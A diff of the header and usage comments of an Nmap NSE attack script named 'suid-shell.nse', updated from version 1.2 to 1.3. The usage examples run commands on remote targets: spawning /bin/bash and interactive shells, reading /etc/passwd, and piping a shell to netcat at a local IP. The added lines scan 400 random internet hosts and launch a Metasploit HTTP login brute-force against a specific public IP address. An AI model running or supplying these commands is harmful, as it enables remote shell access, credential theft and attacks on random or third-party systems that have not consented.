@@ -1,8 +1,8 @@
 ---
--- Nmap NSE suid-shell.nse - Version 1.2
+-- Nmap NSE suid-shell.nse - Version 1.3
 -- Copy nse to: /usr/share/nmap/scripts/suid-shell.nse
 -- Update db  : sudo nmap --script-updatedb
--- executing  : nmap --script-help file-checker.nse
+-- executing  : nmap --script-help suid-shell.nse
 ---
 
 
@@ -16,26 +16,28 @@ and: FakeUser.agent (The user-agent to send in header request -> Default: Macint
 
 Some Syntax examples:
 nmap --script-help suid-shell.nse
-nmap -sS -Pn -p 8080 --script suid-shell.nse <target or domain>
-nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=/bin/bash" <target or domain>
-nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=/bin/sh -i" <target or domain>
-nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=cat /etc/passwd" <target or domain>
-nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=/bin/sh | nc 192.168.1.67 8080" <target or domain>
-nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "agent=Mozilla/5.0 (compatible; EvilMonkey)" <target or domain>
-nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=ls -a,agent=Mozilla/5.0 (compatible; EvilMonkey)" <target or domain>
+nmap -sS -Pn -p 80 --script suid-shell.nse <target or domain>
+nmap -sS -Pn -p 80 --script suid-shell.nse --script-args "command=/bin/bash" <target or domain>
+nmap -sS -Pn -p 80 --script suid-shell.nse --script-args "command=/bin/sh -i" <target or domain>
+nmap -sS -Pn -p 80 --script suid-shell.nse --script-args "command=cat /etc/passwd" <target or domain>
+nmap -sS -Pn -p 80 --script suid-shell.nse --script-args "command=/bin/sh | nc 192.168.1.67 8080" <target or domain>
+nmap -sS -Pn -p 80 --script suid-shell.nse --script-args "agent=Mozilla/5.0 (compatible; EvilMonkey)" <target or domain>
+nmap -sS -Pn -p 80 --script suid-shell.nse --script-args "command=ls -a,agent=Mozilla/5.0 (compatible; EvilMonkey)" <target or domain>
+nmap -sV -Pn -T4 -iR 400 -p 80 --script suid-shell.nse --script-args "command=msfconsole -q -x 'use auxiliary/scanner/http/http_login; set RHOSTS 31.192.120.44; exploit'" <target or domain>
 
 ]]
 
 ---
 -- @usage
 -- nmap --script-help suid-shell.nse
--- nmap -sS -Pn -p 8080 --script suid-shell.nse <target or domain>
--- nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=/bin/bash" <target or domain>
--- nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=/bin/sh -i" <target or domain>
--- nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=cat /etc/passwd" <target or domain>
--- nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=/bin/sh | nc 192.168.1.67 8080" <target or domain>
--- nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "agent=Mozilla/5.0 (compatible; EvilMonkey)" <target or domain>
--- nmap -sS -Pn -p 8080 --script suid-shell.nse --script-args "command=ls -a,agent=Mozilla/5.0 (compatible; EvilMonkey)" <target or domain>
+-- nmap -sS -Pn -p 80 --script suid-shell.nse <target or domain>
+-- nmap -sS -Pn -p 80 --script suid-shell.nse --script-args "command=/bin/bash" <target or domain>
+-- nmap -sS -Pn -p 80 --script suid-shell.nse --script-args "command=/bin/sh -i" <target or domain>
+-- nmap -sS -Pn -p 80 --script suid-shell.nse --script-args "command=cat /etc/passwd" <target or domain>
+-- nmap -sS -Pn -p 80 --script suid-shell.nse --script-args "command=/bin/sh | nc 192.168.1.67 8080" <target or domain>
+-- nmap -sS -Pn -p 80 --script suid-shell.nse --script-args "agent=Mozilla/5.0 (compatible; EvilMonkey)" <target or domain>
+-- nmap -sS -Pn -p 80 --script suid-shell.nse --script-args "command=ls -a,agent=Mozilla/5.0 (compatible; EvilMonkey)" <target or domain>
+-- nmap -sS -Pn -iR 400 -p 80 --script suid-shell.nse --script-args "command=msfconsole -q -x 'use auxiliary/scanner/http/http_login; set RHOSTS 31.192.120.44; exploit'" <target or domain>
 -- @output
 -- PORT   STATE SERVICE
 -- 80/tcp open  http
